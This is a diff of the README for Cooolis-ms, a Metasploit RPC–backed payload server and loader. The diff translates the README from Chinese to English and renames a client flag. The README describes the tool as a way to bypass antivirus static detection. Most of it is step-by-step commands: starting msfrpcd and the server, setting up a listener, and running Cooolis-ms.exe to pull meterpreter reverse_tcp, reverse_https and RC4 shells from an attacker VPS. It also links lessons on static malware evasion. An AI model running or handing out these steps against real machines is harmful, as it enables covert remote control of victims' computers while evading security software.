@@ -1,24 +1,35 @@
 # Cooolis-ms
 
+[中文说明](./README-zh.md)
+
+--------
+
 ![README](./Pic/view-1.png)
 
-Cooolis-ms 是一个支持Metasploit Framework RPC的一个服务端，用于给Shellcode和PE加载器工作，在一定程度上绕过反病毒软件的静态查杀，同时可以让Cooolis-ms服务端与Metasploit服务器进行分离。
+Cooolis-ms is a server that supports Metasploit Framework RPC. It is used to work for Shellcode and PE loader, bypassing the static detection of anti-virus software to a certain extent, and allows the Cooolis-ms server to perform with the Metasploit server separate.
 
-加载器执行流程：连接Cooolis-Server，Cooolis-Server连接Metasploit RPC服务端，取回Payload然后发送回加载器
+Loader execution process: 
 
-核心技术：
+1. connect to Cooolis-Server
+2. Cooolis-Server connects to Metasploit RPC server
+3. retrieve the payload and send it back to the loader
+
+
+
+Core technologies:
+
 - [静态恶意代码逃逸（第六课）](https://payloads.online/archivers/2020-01-02/1)
 
 
-## 该项目的优点
+## Advantages of the project
 
-- 体积小（>=100KB）
-- 支持Metasploit所有Payload
-- 参数设置方便
-- 单文件
-- 架构分离
+- small volume (<600KB)
+- Support all Metasploit Payload
+- Simple parameters
+- Single file
+- Support separation
 
-## 你可以参考这里，写出自己的好项目
+## You can refer to here and write your own good projects
 
 - [静态恶意代码逃逸（第一课）](https://payloads.online/archivers/2019-11-10/1)
 - [静态恶意代码逃逸（第二课）](https://payloads.online/archivers/2019-11-10/2)
@@ -27,10 +38,16 @@ Cooolis-ms 是一个支持Metasploit Framework RPC的一个服务端，用于给
 - [静态恶意代码逃逸（第五课）](https://payloads.online/archivers/2019-11-10/5)
 - [静态恶意代码逃逸（第六课）](https://payloads.online/archivers/2020-01-02/1)
 
-## 如何安装
+## How to install
 
 
-### Docker部署（推荐）
+### Choice 1 > Docker deployment (recommend)
+
+
+Youtube:
+
+[![YouTube](./img/2020-09-09-23-20-03.png)](https://youtu.be/StTqXEQ2l-Y?t=35s "YouTube")
+
 
 ```
 $ git clone https://github.com/Rvn0xsy/Cooolis-ms.git
@@ -38,9 +55,9 @@ $ cd Cooolis-ms/Docker
 $ docker-compose up -d
 ```
 
-默认映射监听端口：8899
+Default listening port:8899
 
-### 源码部署
+### Choice 2 > Source code deployment
 
 ```
 $ git clone https://github.com/Rvn0xsy/Cooolis-ms.git
@@ -49,13 +66,15 @@ $ pip3 install -r requirements.txt
 $ python3 server.py -h
 ```
 
-## 如何使用
+## How to use
 
-假设这是我的VPS： 10.20.56.41
+**If you are deploying with Docker, please start directly from the third step.**
 
-### 第一步 启动Metasploit RPC服务端
+Assuming this is my VPS: 10.20.56.41
 
-**启动Metasploit RPC服务端：**
+### First step, start Metasploit RPC server
+
+**Start Metasploit RPC server:**
 
 ```
 $ msfrpcd -U msf -P msf -u /api/1.0/ -a 127.0.0.1
@@ -63,9 +82,9 @@ $ msfrpcd -U msf -P msf -u /api/1.0/ -a 127.0.0.1
 
 ![](img/2020-08-05-11-53-35.png)
 
-### 第二步 启动Cooolis-ms服务端
+### Second step, start the Cooolis-ms server
 
-使得它连接到RPC，并且监听一个端口，用来发送载荷：
+Make it connect to RPC and listen to a port for sending payload:
 
 ```
 $ python3 server.py -U msf -P msf -H 127.0.0.1 -p 55553 -s -v -l 8899 -S 10.20.56.41
@@ -73,7 +92,7 @@ $ python3 server.py -U msf -P msf -H 127.0.0.1 -p 55553 -s -v -l 8899 -S 10.20.5
 
 ![](img/2020-08-05-11-54-24.png)
 
-### 第三步 配置Metasploit监听器
+### Third step, configure Metasploit listener
 
 
 ```
@@ -86,48 +105,51 @@ msf5 > exploit -j
 
 ![](img/2020-08-05-11-57-03.png)
 
-### 第四步 启动Cooolis-ms客户端
+### Fourth step, start the Cooolis-ms client
 
 
 ```
-Cooolis-ms.exe -p windows/meterpreter/reverse_tcp -s LHOST=10.20.56.41,LPORT=8876,Format=dll -H 10.20.56.41 -P 8899
+Cooolis-ms.exe -p windows/meterpreter/reverse_tcp -o LHOST=10.20.56.41,LPORT=8876,Format=dll -H 10.20.56.41 -P 8899
 ```
 
 ![](img/2020-08-05-12-08-07.png)
 
-Q&A : [是否支持RC4加密的Payload?](https://github.com/Rvn0xsy/Cooolis-ms/issues/6)
+Q&A : [Does it support RC4 encrypted Payload?](https://github.com/Rvn0xsy/Cooolis-ms/issues/6)
 
 * windows/meterpreter/reverse_tcp_rc4：
 
 ```
-Cooolis-ms.exe -p windows/meterpreter/reverse_tcp_rc4 -s LHOST=10.20.56.41,LPORT=8876,RC4PASSWORD=rc4_password,Format=dll -H 10.20.56.41 -P 8899
+Cooolis-ms.exe -p windows/meterpreter/reverse_tcp_rc4 -o LHOST=10.20.56.41,LPORT=8876,RC4PASSWORD=rc4_password,Format=dll -H 10.20.56.41 -P 8899
 ```
 
 * windows/meterpreter_reverse_https
 
 ```
-Cooolis-ms.exe -p windows/meterpreter_reverse_https -s LHOST=10.20.56.41,LPORT=8876,LURI=/api/,Format=dll -H 10.20.56.41 -P 8899
+Cooolis-ms.exe -p windows/meterpreter_reverse_https -o LHOST=10.20.56.41,LPORT=8876,LURI=/api/,Format=dll -H 10.20.56.41 -P 8899
 ```
 
 * windows/meterpreter/bind_tcp_rc4
 
 ```
-Cooolis-ms.exe -p windows/meterpreter/bind_tcp_rc4 -s RHOST=10.20.56.11,LPORT=8876,LURI=/api/,Format=dll -H 10.20.56.41 -P 8899
+Cooolis-ms.exe -p windows/meterpreter/bind_tcp_rc4 -o RHOST=10.20.56.11,LPORT=8876,LURI=/api/,Format=dll -H 10.20.56.41 -P 8899
 ```
 
-* ... 其他自行发挥
+* Other...  self-play
 
 
-**注意：Cooolis-ms.exe的-s参数要与msf的配置对应。**
+**Notice：**
+
+1. The `-o` parameter of Cooolis-ms.exe should correspond to the msf configuration.
+2. Since this project relies on the open source project [MemoryModule](https://github.com/fancycode/MemoryModule), it can only support PAYLOAD in DLL format. Need to add `Format=dll` after the -o parameter.
 
 ## 关于其他
 
-如果你觉得这个项目不错，那就给一个Star～
+If you think this project is good, please give me a Star.
 
 
 ## issue
 
-[我要提交建议或问题](https://github.com/Rvn0xsy/Cooolis-ms/issues)
+[I want to submit a suggestion or question](https://github.com/Rvn0xsy/Cooolis-ms/issues)
 
 ## LICENSE
 
